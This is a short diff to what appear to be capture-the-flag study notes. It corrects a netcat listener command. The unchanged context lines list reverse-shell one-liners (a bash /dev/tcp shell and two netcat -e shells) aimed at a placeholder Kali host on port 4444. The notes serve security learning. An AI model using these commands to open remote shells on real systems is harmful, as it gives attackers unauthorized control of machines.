@@ -55,7 +55,7 @@ Strings will print human readable chars of a file. And for a CTF if we are looki
   - `/bin/bash -i >& /dev/tcp/IP-OF-YOUR-KALI/4444 0>&1`
   - `nc IP-OF-YOUR-KALI 4444 –e /bin/bash`
   - `nc IP-OF-YOUR-KALI 4444 –e /bin/sh`
-- *Note: We have to set a listener prior to this with `rlwrap -lvp 4444`*
+- *Note: We have to set a listener prior to this with `rlwrap nc -lvp 4444`*
 
 ## Resources
 
